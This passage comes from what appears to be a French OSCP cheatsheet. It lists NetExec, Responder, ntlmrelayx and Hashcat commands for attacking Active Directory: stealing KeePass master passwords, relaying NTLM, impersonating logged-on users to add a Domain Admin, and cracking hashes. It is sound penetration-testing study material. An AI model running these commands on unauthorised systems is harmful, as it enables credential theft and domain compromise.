# Vous pouvez vérifier si keepass est installé sur l'ordinateur cible, puis voler le mot de passe maître et déchiffrer la base de données
nxc smb [target] -u [username] -p [password] -M keepass_discover

nxc smb [target] -u [username] -p [password] -M keepass_trigger -o KEEPASS_CONFIG_PATH="path_from_module_discovery"

```


### BloodHound

Examiner les objets, les droits et les services du domaine.




<p class="oscp-inline-ref"><strong>Chemin de référence :</strong> <code>~/.nxc/nxc.conf</code></p>


<p class="oscp-command-note">Exemple de configuration NetExec/BloodHound</p>

```text
[BloodHound]
bh_enabled = True
bh_uri = 127.0.0.1
bh_port = 7687
bh_user = user
bh_pass = pass

```


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec ldap [target] -u [username] -p [password] --bloodhound -ns ip --collection All

```


#### Webdav

Examiner les entrées et les réponses de l'application web.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb ip -u [username] -p [password] -M webdav 

```


#### Veeam


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb [target] -u [username] -p [password] -M veeam

```


#### slinky


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb ip -u [username] -p [password] -M slinky 

```


#### ntdsutil


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb ip -u [username] -p [password] -M ntdsutil 

```


#### LDAP-checker

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec ldap [target] -u [username] -p [password] -M ldap-checker

```


#### Vérifier les vulnérabilités Zerologon, PetitPotam et noPac du contrôleur de domaine


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb [target] -u [username] -p [password] -M zerologon

netexec smb [target] -u [username] -p [password] -M petitpotam

netexec smb [target] -u [username] -p [password] -M nopac

```


#### Vérifier l’attribut MachineAccountQuota


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec ldap [target] -u [username] -p [password] -M maq

```


#### Énumération des services de certificats AD (AD CS)


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec ldap [target] -u [username] -p [password] -M adcs

```


#### Récupération du mot de passe du compte MSOL

Vérifier les comptes, les secrets et les mécanismes d'authentification.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb [target] -u [username] -p [password] -M msol

```


#### Relais NTLM


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec smb [target(s)] --gen-relay-list relay.txt

# Alternative avec Nmap
nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 [target(s)]

# Expected Results
SMB         192.168.1.101    445    DC2012A          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012A) (domain:OCEAN) (signing:True) (SMBv1:True)
SMB         192.168.1.102    445    DC2012B          [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC2012B) (domain:EARTH) (signing:True) (SMBv1:True)
SMB         192.168.1.111    445    SERVER1          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:SERVER1) (domain:PACIFIC) (signing:False) (SMBv1:True)
SMB         192.168.1.117    445    WIN10DESK1       [*] WIN10DESK1 x64 (name:WIN10DESK1) (domain:OCEAN) (signing:False) (SMBv1:True)
...SNIP...

cat relay_list.txt
192.168.1.111
192.168.1.117

```


<p class="oscp-command-note">Observer les requêtes de résolution de noms.</p>

```bash
responder -I eth0

```


<p class="oscp-command-note">Commande Impacket dans la rubrique « NTLM Relay Attack ».</p>

```bash
impacket-ntlmrelayx -tf relay.txt -smb2support

```


### Usurpation de l’identité des utilisateurs connectés (Impersonation)


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
nxc smb [target] -u [localAdmin] -p [password] --loggedon-users

```


```bash
nxc smb [target] -u [localAdmin] -p [password] -M schtask_as -o USER=[logged-on-user] CMD=[cmd-command]

# Commande personnalisée pour ajouter un utilisateur au groupe d'administration de domaine : powershell.exe \"Invoke-Command -ComputerName [DC_NAME] -ScriptBlock {Add-ADGroupMember -Identity 'Domain Admins' -Members USER.NAME}\"

```

![Impersonate Logged In Users with NetExec.](https://www.emmanuelsolis.com/img/netexec_01.png)


### Environnement multidomaine

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner un service Windows avec NetExec.</p>

```bash
netexec [protocol] [target(s)] -u FILE -p password

```




<p class="oscp-command-note">Exemples de comptes avec domaines</p>

```text
DOMAIN1\user
DOMAIN2\user

```




```text
[domains]\[users]

```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
python3 script.py -u [users_list].txt -d [domains_list].txt

```


<p class="oscp-command-note">Script Python pour créer des combinaisons domaine-utilisateur.</p>

```python
import argparse

def main():
    # Configurer l'analyse des arguments
    parser = argparse.ArgumentParser(description="Generate combinations of domains and users.")
    parser.add_argument("-d", "--domain", required=True, help="Path to the domains file")
    parser.add_argument("-u", "--users", required=True, help="Path to the users file")
    parser.add_argument("-o", "--output", default="output.txt", help="Output file name (default: output.txt)")
    args = parser.parse_args()

    # Lire les domaines et les utilisateurs à partir des fichiers fournis
    try:
        with open(args.domain, "r") as domains_file:
            domains = [line.strip() for line in domains_file.readlines()]

        with open(args.users, "r") as users_file:
            users = [line.strip() for line in users_file.readlines()]
    except FileNotFoundError as e:
        print(f"Error: {e}")
        return

    # Générer les combinaisons
    combinations = [f"{domain}\\{user}" for user in users for domain in domains]

    # Écrivez les combinaisons dans le fichier de sortie
    with open(args.output, "w") as output_file:
        output_file.write("\n".join(combinations))

    print(f"Combinations generated and saved to {args.output}!")

if __name__ == "__main__":
    main()

```


## Identifier les formats et préparer un audit de mots de passe

Avant tout cassage hors ligne, identifier le format exact : une chaîne qui ressemble à un hash peut aussi être un identifiant, un sel ou un jeton. Utiliser des fichiers et secrets explicitement autorisés.

### Reconnaître un format possible

HashID propose des familles de formats à partir d'une chaîne, sans garantir un diagnostic unique.

<p class="oscp-command-note">Reconnaître un format possible.</p>

```bash
hashid '<HASH_A_IDENTIFIER>'
```

### Consulter les exemples officiels de Hashcat

Parcourir les exemples intégrés pour vérifier la structure attendue d'un hash et le mode correspondant.

<p class="oscp-command-note">Consulter les exemples officiels de Hashcat.</p>

```bash
hashcat --example-hashes
```

### Appliquer une liste de règles hors ligne

Tester une liste de mots et un fichier de règles sur les empreintes autorisées. Adapter le mode au format détecté.

<p class="oscp-command-note">Appliquer une liste de règles hors ligne.</p>

```bash
hashcat -m <MODE> -a 0 <FICHIER_HASHES> <LISTE_MOTS> -r <FICHIER_REGLES>
```

### Préparer un hash pour John the Ripper

Transformer un fichier KeePass de laboratoire dans un format exploitable par John, sans modifier le fichier original.

<p class="oscp-command-note">Préparer un hash pour John the Ripper.</p>

```bash
keepass2john <COFFRE>.kdbx > <SORTIE>.hash
```

### Construire une liste de mots contextuelle

Générer un dictionnaire depuis un site appartenant au périmètre d'audit ; relire les résultats avant usage.

<p class="oscp-command-note">Construire une liste de mots contextuelle.</p>

```bash
cewl -w <LISTE_MOTS>.txt 'https://<HOTE_AUTORISE>/'
```

**Référence technique complémentaire :** [Notes OSCP de krovs](https://github.com/krovs/oscp-notes/blob/main/docs/14_password_attacks.md). Cette synthèse conserve la structure de SKILL-ISSUE et reformule les explications.

<!-- notes-krovs-2026 -->

---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).

<!-- refined-oscp -->
